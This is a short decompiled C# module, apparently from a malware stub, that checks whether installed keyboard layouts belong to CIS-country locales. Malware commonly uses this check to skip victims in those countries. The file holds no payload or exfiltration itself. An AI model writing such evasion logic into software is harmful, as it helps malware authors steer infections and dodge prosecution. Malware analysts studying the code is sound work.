using System;
using System.Globalization;
using System.Linq;
using System.Windows.Forms;

namespace Stub.Modules.Protects
{
	// Token: 0x02000006 RID: 6
	internal class CISCheck
	{
		// Token: 0x06000009 RID: 9 RVA: 0x0000225C File Offset: 0x0000045C
		public static bool IsCIS()
		{
			InputLanguageCollection installedInputLanguages = InputLanguage.InstalledInputLanguages;
			CultureInfo[] desiredCultures = new CultureInfo[]
			{
				new CultureInfo("ru-RU"),
				new CultureInfo("kk-KZ"),
				new CultureInfo("ro-MD"),
				new CultureInfo("uz-UZ"),
				new CultureInfo("be-BY"),
				new CultureInfo("az-Latn-AZ"),
				new CultureInfo("hy-AM"),
				new CultureInfo("ky-KG"),
				new CultureInfo("tg-Cyrl-TJ")
			};
			return installedInputLanguages.Cast<InputLanguage>().Any((InputLanguage language) => Array.Exists<CultureInfo>(desiredCultures, (CultureInfo culture) => culture.Equals(language.Culture)));
		}
	}
}
